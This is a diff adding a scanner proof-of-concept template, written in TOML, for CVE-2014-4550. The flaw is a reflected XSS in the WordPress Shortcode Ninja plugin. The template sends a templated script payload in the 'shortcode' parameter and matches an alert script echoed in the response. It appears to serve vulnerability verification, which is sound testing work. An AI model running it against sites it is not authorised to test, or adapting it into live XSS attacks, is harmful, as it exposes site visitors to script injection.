@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "利用Shortcode Ninja插件preview-shortcode-external.php文件中对shortcode参数过滤不严的漏洞，验证反射型XSS攻击。在不具备权限的环境中，通过构造恶意URL诱使用户打开，检查是否可将JS脚本注入并在用户浏览器中执行。"
+id = "POC-AVE-2014-0023"
+name = "WordPress Shortcode Ninja XSS漏洞验证"
+severity = "medium"
+tags = ["ave-2014-0023"]
+vuln_id = [
+    "CVE-2014-4550",
+    "AVE-2014-0023",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wp-content/plugins/shortcode-ninja/preview-shortcode-external.php"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+shortcode = "{{{REQUEST_PAYLOAD}}}"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
